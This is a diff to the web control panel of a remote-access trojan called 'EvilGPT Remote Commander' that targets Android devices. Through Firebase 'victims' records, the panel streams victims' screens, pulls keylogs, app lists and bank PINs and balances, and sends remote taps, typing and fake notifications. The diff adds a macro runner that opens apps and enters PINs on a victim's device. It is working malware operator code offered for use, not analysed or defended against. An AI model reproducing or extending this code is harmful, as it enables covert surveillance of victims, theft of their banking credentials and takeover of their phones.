@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>EvilGPT Remote Commander</title>
+    <title>EvilGPT Remote Commander – Full Macro</title>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
@@ -13,7 +13,7 @@
         .container { max-width:900px; margin:auto; }
         .header { text-align:center; margin-bottom:25px; color:#58a6ff; font-size:28px; }
         .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:20px; margin-bottom:16px; }
-        select, input:not([type=file]), button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:10px; border-radius:6px; font-size:14px; margin:4px 0; width:100%; }
+        select, input:not([type=file]), button, textarea { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:10px; border-radius:6px; font-size:14px; margin:4px 0; width:100%; }
         button { cursor:pointer; transition:background 0.2s; width:auto; }
         button:hover { background:#30363d; }
         .btn-danger { background:#da3633; border-color:#f85149; }
@@ -31,11 +31,12 @@
         .password-section > * { margin-bottom:15px; }
         .hidden { display:none; }
         #typingField { width:100%; margin-top:6px; }
+        .macro-editor { width:100%; height:120px; font-family:monospace; background:#0d1117; color:#c9d1d9; border:1px solid #30363d; padding:10px; resize:vertical; }
     </style>
 </head>
 <body>
 <div class="container" id="mainPanel" class="hidden">
-    <h1 class="header">💀 EvilGPT Interactive RAT</h1>
+    <h1 class="header">💀 EvilGPT Interactive RAT – Macro Ready</h1>
 
     <div class="card">
         <label>🎯 Target Device:</label>
@@ -51,6 +52,17 @@
         </div>
         <button onclick="sendCmd({type:'start_screen_capture'})">⟡ Start Stream</button>
         <p style="font-size:12px; color:#8b949e;">Click = Tap &nbsp;|&nbsp; Drag = Swipe</p>
+    </div>
+
+    <div class="card">
+        <h3>🤖 Macro Prompt (AI Automation)</h3>
+        <textarea id="macroInput" class="macro-editor" placeholder='launch:com.tili.ffg
+wait:2000
+tap:540,1200
+type:1234
+tap:800,1500'></textarea>
+        <button class="btn-danger" onclick="runMacro()">▶ Execute Macro</button>
+        <p style="font-size:12px; color:#8b949e; margin-top:5px;">Format: command:data. Supported: launch, wait, tap, type, swipe, home, back</p>
     </div>
 
     <div class="card">
@@ -78,9 +90,9 @@
 
     <div class="card">
         <h3>🔥 Data Extraction</h3>
-        <button onclick="sendCmd({type:'get_keylogs'})">Keylogs</button>
         <button onclick="sendCmd({type:'get_apps'})">App List</button>
-        <button onclick="sendCmd({type:'get_bank_data'})">Bank Info</button>
+        <button onclick="sendCmd({type:'get_keylogs'})">Keylogs</button>
+        <button onclick="sendCmd({type:'get_bank_data'})">Refresh Bank Data</button>
         <pre id="infoOutput" class="output">No data yet...</pre>
     </div>
 
@@ -113,6 +125,7 @@
     const PWD = "adminpassord$#@322";
     let selectedDevice = null, devWidth = 1080, devHeight = 1920;
 
+    // ---------- AUTH ----------
     function checkPassword(){
         if(document.getElementById('passInput').value === PWD){
             document.getElementById('loginContainer').style.display='none';
@@ -121,6 +134,7 @@
         } else alert('Wrong password');
     }
 
+    // ---------- DEVICE LIST ----------
     function refreshDevices(){
         db.ref('telegram2_secret/victims').on('value', snap => {
             const sel = document.getElementById('deviceSelect');
@@ -143,17 +157,23 @@
         loadDeviceInfo();
     });
 
+    // ---------- LIVE DATA (screen + bank) ----------
     function loadDeviceInfo(){
+        // screen info
         db.ref(`telegram2_secret/victims/${selectedDevice}/screenInfo`).on('value', s => {
             if(s.exists()){
                 devWidth = s.val().width || 1080;
                 devHeight = s.val().height || 1920;
             }
         });
+
+        // live screen frame
         db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).off();
         db.ref(`telegram2_secret/victims/${selectedDevice}/screen`).on('value', s => {
             if(s.exists()) document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + s.val();
         });
+
+        // apps & keylogs
         db.ref(`telegram2_secret/victims/${selectedDevice}/info`).off();
         db.ref(`telegram2_secret/victims/${selectedDevice}/info`).on('value', s => {
             const d = s.val()||{};
@@ -162,19 +182,27 @@
             if(d.apps) out += '📱 Apps:\n'+d.apps+'\n\n';
             document.getElementById('infoOutput').textContent = out||'No data';
         });
+
+        // Bank data (PINs, balances)
         db.ref(`telegram2_secret/victims/${selectedDevice}/bank`).off();
         db.ref(`telegram2_secret/victims/${selectedDevice}/bank`).on('value', s => {
             if(s.exists()){
-                document.getElementById('infoOutput').textContent += '\n💰 Bank Data:\n'+s.val();
+                let bankOut = '💰 Bank Data (PINs & Balances):\n';
+                s.forEach(child => {
+                    bankOut += child.val() + '\n';
+                });
+                document.getElementById('infoOutput').textContent += '\n' + bankOut;
             }
         });
     }
 
+    // ---------- SEND COMMAND ----------
     function sendCmd(obj){
         if(!selectedDevice) return alert('Select a device');
         db.ref(`telegram2_secret/victims/${selectedDevice}/commands`).push().set(obj);
     }
 
+    // ---------- INTERACTIVE SCREEN ----------
     const canvas = document.getElementById('overlay');
     const screenImg = document.getElementById('screenFrame');
     function resizeCanvas(){
@@ -232,6 +260,7 @@
         document.getElementById('typingField').value = '';
     }
 
+    // ---------- NOTIFICATION ----------
     function uploadFile(inputId, hiddenId){
         const file = document.getElementById(inputId).files[0];
         if(!file) return;
@@ -250,6 +279,55 @@
             bigPictureUrl: document.getElementById('bigPicUrl').value
         });
     }
+
+    // ---------- MACRO EXECUTION ----------
+    function runMacro(){
+        const raw = document.getElementById('macroInput').value.trim();
+        if(!raw) return alert('Enter macro commands!');
+        const lines = raw.split('\n').filter(l => l.trim() !== '');
+        const steps = [];
+
+        for(let line of lines){
+            const [cmd, ...args] = line.split(':');
+            const type = cmd.trim();
+            const data = args.join(':').trim();
+
+            switch(type){
+                case 'launch':
+                    steps.push({type:'launch', data: data});
+                    break;
+                case 'wait':
+                    steps.push({type:'wait', data: parseInt(data)});
+                    break;
+                case 'tap':
+                    const [x,y] = data.split(',').map(Number);
+                    steps.push({type:'tap', data:{x:x, y:y}});
+                    break;
+                case 'type':
+                    steps.push({type:'type', data: data});
+                    break;
+                case 'swipe':
+                    const [sx,sy,ex,ey,dur] = data.split(',').map(Number);
+                    steps.push({type:'swipe', data:{sx:sx, sy:sy, ex:ex, ey:ey, dur:dur||300}});
+                    break;
+                case 'home':
+                    steps.push({type:'home'});
+                    break;
+                case 'back':
+                    steps.push({type:'back'});
+                    break;
+                default:
+                    console.warn('Unknown command:', type);
+            }
+        }
+
+        if(steps.length > 0){
+            sendCmd({type:'macro', steps:steps});
+            alert('Macro sent to device! Check Firebase for progress.');
+        } else {
+            alert('No valid commands found.');
+        }
+    }
 </script>
 </body>
-    </html>
+                </html>
